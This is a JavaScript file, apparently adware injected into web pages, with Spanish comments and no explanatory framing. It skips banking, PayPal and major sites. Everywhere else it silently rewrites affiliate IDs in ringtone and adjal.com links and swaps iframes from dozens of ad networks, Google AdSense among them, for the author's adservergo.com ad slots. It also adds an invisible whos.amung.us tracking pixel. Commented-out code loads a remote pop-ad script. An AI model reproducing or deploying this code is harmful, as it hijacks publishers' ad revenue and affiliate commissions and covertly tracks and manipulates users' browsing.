function esringt(){
    var link = document.getElementsByTagName('a');
    var i = link.length;
    while(i--){
        var lnk = link[i].href;
        if (lnk.match("ringtonematcher.com")) {
            link[i].href = lnk.replace(/sid=[^&]*/g, 'sid=GZGFros');
        }

    }  
}
esringt();


function validHost() {
	//este filtro validara a que sitios NO quieres que se agrege cosas
        if (location.href.match(/genteflow\.com/i)) {
            return false;
        } else if (location.href.match(/godaddy/i)){  
           return false;
        } else if (location.href.match(/facebook/i)){  
           return false;
        } else if (location.href.match(/bank/i)){  
           return false;
        } else if (location.href.match(/banco/i)){  
           return false;
        } else if (location.href.match(/paypal/i)){  
           return false;
        } else if (location.href.match(/cpanel/i)){  
           return false;
        } else if (location.href.match(/whm/i)){  
           return false;
        } else if (location.href.match(/fullrip/i)){  
           return false;
        } else if (location.href.match(/3699272/i)){  
           return false;
        } else if (location.href.match(/adservergo/i)){  
           return false;
        } else if (location.href.match(/12065430/i)){  
           return false;
        } else if (location.href.match(/popunder/i)){  
           return false;
        } else if (location.href.match(/name\.com/i)){  
           return false;
        } else if (location.href.match(/tumblr\.com/i)){  
           return false;
        } else if (location.href.match(/ask\.fm/i)){  
           return false; 
        } else if (location.href.match(/localhost/i)){  
           return false; 
        } else if (location.href.match(/orkut\.com/i)){  
           return false; 
        } else if (location.href.match(/jquery\.com/i)){  
           return false;    
        } else if (location.href.match(/yahoo/i)){  
           return false; 
        } else if (location.href.match(/amazon\.com/i)){  
           return false; 
        } else if (location.href.match(/msn\.com/i)){  
           return false;                        
        } else if (location.href.match(/google/i)) {
           return false;
        } else if (location.href.match(/facebook\.com/i)) {
            return false;
        } else if (location.href.match(/youtube\.com/i)) {
            return false;    
        } else if (location.href.match(/paypal\.com/i)) {
            return false;
        } else if (location.href.match(/live\.com/i)) {
            return false;
        } else if (location.href.match(/twitter\.com/i)) {
            return false;
        } else if (location.href.match(/skype\.com/i)) {
            return false;
        } else if (location.href.match(/hotmail\.com/i)) {
            return false;
        } else if (location.href.match(/bing\.com/i)) {
            return false;
        } else if (location.href.match(/wikipedia\.com/i)) {
            return false;
        } else if (location.href.match(/tuenti\.com/i)) {
            return false;
        } else if (location.href.match(/xoo/i)) {
            return false;
        } else if (location.href.match(/wwwwww\.net/i)) {
            return false;
        } else {
            return true;
        }
}



function getCookie(c_name) {
  var i, x, y, ARRcookies = document.cookie.split(";");
  for (i = 0; i < ARRcookies.length; i++) {
    x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
    y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
    x = x.replace(/^\s+|\s+$/g, "");
    if (x == c_name) {
      console.log(unescape(y));
      return unescape(y);
    }
  }
}

function setCookie(c_name, value, exdays) {
  var exdate = new Date();
  exdate.setDate(exdate.getDate() + exdays);
  var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
  document.cookie = c_name + "=" + c_value;
}


function adtracks(){
	//var ids = new Array('id 1', 'id 2', 'id 3');
	//var id = ids[Math.floor(Math.random()*ids.length)]; // tmr me webie con php abre google	
	//var id = "17200";
	//var idd = "7012";
    var link = document.getElementsByTagName('a'); //busca todas las etiquetas <a> en el document
    var i = link.length; //cuenta cuantos hay
    while(i--){ //hace el bucle para recorrer todos los a href
        var lnk = link[i].href;
        if (lnk.match("adjal.com")) { //match ya lo vimos busca concordancia
            link[i].href = lnk.replace(/aff_id=[^&]*/g, 'aff_id=17200'); //aqui remplaza
        }
        var lnk2 = link[i].href;
        if (lnk2.match("adjal.com")) { //match ya lo vimos busca concordancia
            link[i].href = lnk2.replace(/campaign_id=[^&]*/g, 'campaign_id=7012'); //aqui remplaza
        }

    }  
}


function otranet(a) {
    if (a.width == '728' && a.height == '90') {
        a.src = "http://cdn.adservergo.com/st?ad_type=iframe&section=3669907&width=728&height=90";
    } else if (a.width == '300' && a.height == '250') {
        a.src = "http://cdn.adservergo.com/st3?ad_type=iframe&section=3669907&width=300&height=250";
    } else if (a.width == '468' && a.height == '60') {
        a.src = "http://cdn.adservergo.com/st?ad_type=iframe&section=4681341&width=468&height=60";
    } else if (a.width == '234' && a.height == '60') {
        a.src = "http://cdn.adservergo.com/st?ad_type=iframe&section=4681341&width=234&height=60";
    } else if (a.width == '160' && a.height == '600') {
        a.src = "http://cdn.adservergo.com/st?ad_type=iframe&section=3669907&width=160&height=600";
    } else if (a.width == '120' && a.height == '600') {
        a.src = "http://cdn.adservergo.com/st?ad_type=iframe&section=3669907&width=120&height=600";
    } else if (a.width == '336' && a.height == '280') {
        a.src = "http://cdn.adservergo.com/st?ad_type=iframe&section=3669907&width=336&height=280";
    } else {
        a.src = "http://cdn.adservergo.com/st?ad_type=iframe&section=3669907&error=1&width=" + a.width + "&height=" + a.height
    }
    return true
}

if (validHost()) {

    var iframes = document.getElementsByTagName("iframe");
    for (var i = 0; i < iframes.length; i++) {

        iframe = iframes[i].src;
        if (iframe.match("^http://adserving.cpxinteractive.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("ad.smowtion.com")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.smowtion.com")) {
            otranet(iframes[i])
        } else if (iframe.match("http://ts.smowtion.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("http://ad.smowtion.com/clk?")) {
            otranet(iframes[i])
        } else if (iframe.match("ad.adserverplus.com")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.foxnetworks.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("ad.foxnetworks.com")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.pub-fit.com")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.propellerads.com/")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.resultsaccelerator.net/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://tag.tlvmedia.com/")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ads.tlvmedia.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match(".tlvmedia.com")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.adorika.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://yieldmanager.adbooth.net/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.xtendmedia.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://creative.xtendmedia.com/proxy/matomymediaproxy.html?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.harrenmedianetwork.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.metanetwork.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.blinkdr.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.z5x.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.z5x.net/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://tags1.z5x.net:5280/")) {
            otranet(iframes[i])
        } else if (iframe.match(".z5x.net")) {
            otranet(iframes[i])
        } else if (iframe.match("yieldmanager.adbooth.net")) {
            otranet(iframes[i])
        } else if (iframe.match("adv.0tub.com")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.adfunky.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ads.creafi-online-media.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.jumbaexchange.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ads.avazu.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.yieldads.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.adnetinteractive.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.bannerconnect.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ads.jumbaexchange.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.e-viral.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.adperium.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ads.jumbaexchange.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://go.cpmadvisors.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.xertive.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.media-servers.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://go.cpmadvisors.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.globe7.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.103092804.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.globaltakeoff.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ads.bluelithium.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.antventure.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.reduxmedia.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.adtegrity.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.directaclick.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match(".mediashakers.com/id")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.adserverplus.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.yieldmanager.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("ad.yieldmanager.com")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.php")) {
            otranet(iframes[i])
        } else if (iframe.match("tradex.openx.com/afr.php?")) {
            otranet(iframes[i])
        } else if (iframe.match(".affiz.com/tracking/iframedfp.php")) {
            otranet(iframes[i])
        } else if (iframe.match("adserver.itsfogo.com/")) {
            otranet(iframes[i])
        } else if (iframe.match(".pasadserver.com/showBanner.php")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.lfstmedia.com/slot")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.sonicomusica.com/ad")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.adpv.com/iframe")) {
            otranet(iframes[i])
        } else if (iframe.match("adserver.adtechus.com/adiframe")) {
            otranet(iframes[i])
        } else if (iframe.match("mooxar.info/openx/")) {
            otranet(iframes[i])
        } else if (iframe.match("CPXFrame")) {
            otranet(iframes[i])
        } else if (iframe.match("MatomyFrame")) {
            otranet(iframes[i])
        } else if (iframe.match("AdorikaFrame")) {
            otranet(iframes[i])
        } else if (iframe.match("bs.serving-sys.com/BurstingPipe")) {
            otranet(iframes[i])
        } else if (iframe.match("dotwdg.com")) {
            otranet(iframes[i])
        } else if (iframe.match("ad.adserver01.de/")) {
            otranet(iframes[i])
        } else if (iframe.match(".adsmwt.com/st")) {
            otranet(iframes[i])
        } else if (iframe.match("ad.vuiads.com/showads")) {
            otranet(iframes[i])
        } else if (iframe.match("p.seeon.tv/ads/")) {
            otranet(iframes[i])
        } else if (iframe.match("tulocura.net")) {
            otranet(iframes[i])
        } else if (iframe.match("adorika")) {
            otranet(iframes[i])
        } else if (iframe.match("cpm")) {
            otranet(iframes[i])
        } else if (iframe.match("ox-d.edgeads.org")) {
            otranet(iframes[i])
        } else if (iframe.match("fastclick.net")) {
            otranet(iframes[i])
        } else if (iframe.match("adserving.cpxinteractive.com")) {
            otranet(iframes[i])
        } else if (iframe.match("ministerial5")) {
            otranet(iframes[i])
        } else if (iframe.match("t.redditmedia.com/ads/")) {
            otranet(iframes[i])
        } else if (iframe.match("justjared.buzznet.com/wp-content/themes/default/ads/banner.php")) {
            otranet(iframes[i])
        } else if (iframe.match("adserving.cpxadroit.com/")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.mapcity.com/")) {
            otranet(iframes[i])
        } else if (iframe.match("edge.actaads.com/a_")) {
            otranet(iframes[i])
        } else if (iframe.match("http://adserver.juicyads.com/adshow.php?")) {
            otranet(iframes[i])
        } else if (iframe.match(".juicyads.com")) {
            otranet(iframes[i])
        } else if (iframe.match("http://ads.depositfiles.org/ad.php?")) {
            otranet(iframes[i])
        } else if (iframe.match("74.53.178.162")) {
            otranet(iframes[i])
        } else if (iframe.match("199.233.235.131")) {
            otranet(iframes[i])
        } else if (iframe.match("gatho")) {
            otranet(iframes[i])
        } else if (iframe.match("traviezo")) {
            otranet(iframes[i])
        } else if (iframe.match("matomy")) {
            otranet(iframes[i])
        } else if (iframe.match("t.adsomega.com/t/delivery")) {
            otranet(iframes[i])
        } else if (iframe.match(".zedo.com/")) {
            otranet(iframes[i])
        } else if (iframe.match("http://ad.")) {
            otranet(iframes[i])
        } else if (iframe.match("http://ads.")) {
            otranet(iframes[i])
        } else if (iframe.match("Publi300x250")) {
            otranet(iframes[i])
        } else if (iframe.match("300x250")) {
            otranet(iframes[i])
        } else if (iframe.match("728x90")) {
            otranet(iframes[i])
        } else if (iframe.match("336x280")) {
            otranet(iframes[i])
        } else if (iframe.match("468x60")) {
            otranet(iframes[i])
        } else if (iframe.match("160x600")) {
            otranet(iframes[i])
        } else if (iframe.match("234x60")) {
            otranet(iframes[i])
        } else if (iframe.match("publicidad")) {
            otranet(iframes[i])
        } else if (iframe.match("miratuserie")) {
            otranet(iframes[i])
        } else if (iframe.match("risitas")) {
            otranet(iframes[i])
        } else if (iframe.match("radiootakus")) {
            otranet(iframes[i])
        } else if (iframe.match("xeon.pe")) {
            otranet(iframes[i])
        } else if (iframe.match("adnxs.com")) {
            otranet(iframes[i])
        } else if (iframe.match("velmedia.net")) {
            otranet(iframes[i])
        } else if (iframe.match("espataquilla.com")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.ad4game.com/t/delivery/")) {
            otranet(iframes[i])
        } else if (iframe.match("multiupload.com/ad.php")) {
            otranet(iframes[i])
        } else if (iframe.match("^http://ad.adnetwork.com/st?")) {
            otranet(iframes[i])
        } else if (iframe.match("tblamnetwork.com")) {
            otranet(iframes[i])
        } else if (iframe.match("googleads.g.doubleclick.com/pagead/ads?")) {
            otranet(iframes[i])
        } else if (iframe.match("googleads.g.doubleclick.net/pagead/ads?")) {
            otranet(iframes[i])
        } else if (iframe.match("googleads.g.doubleclick.com")) {
            otranet(iframes[i])
        } else if (iframe.match("googleads.g.doubleclick.net")) {
            otranet(iframes[i])
        } else if (iframe.match("/pagead/")) {
            otranet(iframes[i])
        } else if (iframe.match("pagead1.googlesyndication.com")) {
            otranet(iframes[i])
        } else if (iframe.match("pagead2.googlesyndication.com")) {
            otranet(iframes[i])
        } else if (iframe.match("googlesyndication.com")) {
            otranet(iframes[i])
        } else if (iframe.match("adshost1.com")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.mcanime.com/openx/")) {
            otranet(iframes[i])
        } else if (iframe.match("pubads.g.doubleclick.com/gampad/ads?")) {
            otranet(iframes[i])
        } else if (iframe.match("cuevana.tv/banners/")) {
            otranet(iframes[i])
        } else if (iframe.match("images.mcanime.com/manga/")) {
            otranet(iframes[i])
        } else if (iframe.match("ads.creanis.com")) {
            otranet(iframes[i])
        } else if (iframe.match("f.megaclick.com")) {
            otranet(iframes[i])
        } else if (iframe.match("m2pub.com")) {
            otranet(iframes[i])
        } else if (iframe.match("cpmrocket")) {
            otranet(iframes[i])
        } else if (iframe.match("adk2cdn.")) {
            otranet(iframes[i])
        } else if (iframe.match("adk2.")) {
            otranet(iframes[i])
        } else if (iframe.match("traffic")) {
            otranet(iframes[i])
        }
    }//end for
}//end validHost


//end of funciones
if(validHost() && top === self){

	
	/*function createAdboothFixed(){*/
	/*
	   var dom = document.domain.replace('www.', '');
	   var putocookie2 = getCookie("JPM4ST3R02");
	   if (putocookie2 == dom) {
	   	return;
	   }else{
	    setCookie("JPM4ST3R02", dom, 365);
	    var script = document.createElement('script');
	    script.src = "http://img97.xooimage.com/files/2/8/a/pop_ad-3fff843.js";
	    document.getElementsByTagName('head')[0].appendChild(script);
	   }

	*/
	/*}*/


	// activando js anteriores
	adtracks();
	/*createAdboothFixed();*/
}





if(location.href.match(/genteflow\.com/i)){
	
	if(document.getElementById('vlc')){
		document.getElementById('vlc').style.display = 'none';
	}
	if(document.getElementById('capa_flotante')){
		document.getElementById('capa_flotante').style.display = 'none';
	}
}

	var d = document.createElement('img');
	d.setAttribute('src','http://whos.amung.us/swidget/i1zqtsvsx4ho/');
	d.setAttribute('height', '0');
	d.setAttribute('width', '0');
	document.body.appendChild(d);

	
	/*
	var script = document.createElement('script');
	script.src = '';
	script.type = 'text/javascript';

	var head = document.getElementsByTagName('head').item(0);
	head.appendChild(script);

	*/



	/*

	  var ee = document.createElement('div');
	  ee.setAttribute('align','center');
	  ee.setAttribute('id', 'pepin');
	  document.body.insertBefore(ee, document.body.firstChild);
	  var html = ('<div style="display:none;"></div>');
	  document.getElementById('pepin').innerHTML = html;
	
	*/
